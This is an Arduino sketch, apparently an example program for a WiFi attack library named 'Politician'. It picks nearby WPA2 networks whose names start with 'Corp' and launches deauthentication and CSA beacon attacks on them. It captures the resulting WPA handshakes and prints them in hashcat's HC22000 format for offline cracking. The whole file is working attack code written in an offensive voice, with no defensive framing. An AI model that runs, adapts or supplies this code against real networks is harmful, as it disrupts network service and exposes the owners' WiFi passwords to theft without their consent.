#include <Arduino.h>
#include <Politician.h>
#include <PoliticianFormat.h>

using namespace politician;
using namespace politician::format;

Politician engine;

void onHandshake(const HandshakeRecord &rec) {
    Serial.println("\n========================================");
    Serial.printf("[!] HIGH-VALUE TARGET CAPTURED: %s\n", rec.ssid);
    Serial.println("========================================");
    Serial.printf("HC22000: %s\n", toHC22000(rec).c_str());
    Serial.println("========================================\n");
}

// ---------------------------------------------------------
// The Magic Filter: 
// This lambda function is executed by the core engine 
// every time a router is discovered. 
// If this function returns 'false', the engine completely 
// ignores the network and saves its attack energy.
// ---------------------------------------------------------
bool myTargetingFilter(const ApRecord &ap) {
    // 1. FILTER BY RSSI (Signal Strength)
    // We only want to attack routers physically close to us.
    // -60 dBm is roughly 10 meters away.
    if (ap.rssi < -60) {
        return false; 
    }
    
    // 2. FILTER BY ENCRYPTION
    // 0 = Open, 1 = WEP, 2 = WPA, 3 = WPA2, 4 = WPA3
    // Open networks don't have handshakes, so we ignore them.
    if (ap.enc < 3) {
        return false;
    }

    // 3. FILTER BY SSID PREFIX 
    // We only want to target corporate networks
    // (e.g., "CorpSec", "CorpGuest", "CorpNet")
    if (strncmp(ap.ssid, "Corp", 4) != 0) {
        return false; 
    }

    // 4. PREVENT ATTACKING SPECIFIC ROUTERS
    // Never attack the CEO's personal router
    uint8_t ceo_mac[6] = {0xAA, 0xBB, 0xCC, 0xDD, 0xEE, 0xFF};
    if (memcmp(ap.bssid, ceo_mac, 6) == 0) {
        return false;
    }

    // If the network survives all the filters above, it is a 
    // high-value target! Tell the engine to unleash Hell:
    Serial.printf("[Target Locked] Attacking %s (RSSI: %d)\n", ap.ssid, ap.rssi);
    return true; 
}

void setup() {
    Serial.begin(115200);
    delay(2000);

    Serial.println("\n[+] Starting Politician in Targeted Mode");

    // Route handshakes to our serial monitor
    engine.setEapolCallback(onHandshake);
    
    // Inject our custom targeting logic into the core engine
    engine.setTargetFilter(myTargetingFilter);

    // Provide a targeted configuration
    Config cfg;
    cfg.capture_filter = LOG_FILTER_HANDSHAKES; // Only log crackable material to save space
    cfg.skip_immune_networks = true; // Don't waste time attacking WPA3-only networks
    engine.begin(cfg);
    
    // Arm the weapons (Modern CSA Beacons + Legacy Deauth)
    engine.setAttackMask(ATTACK_CSA | ATTACK_DEAUTH);
    engine.startHopping();
    
    // You can also completely lock the engine to a single specific router
    // instead of hopping dynamically, by using setTarget:
    // uint8_t target_mac[6] = { 0x11, 0x22, 0x33, 0x44, 0x55, 0x66 };
    // engine.setTarget(target_mac, 6); // Stay on channel 6 forever
}

void loop() {
    // Keep the high-speed autonomous hopping loop running
    engine.tick();
}
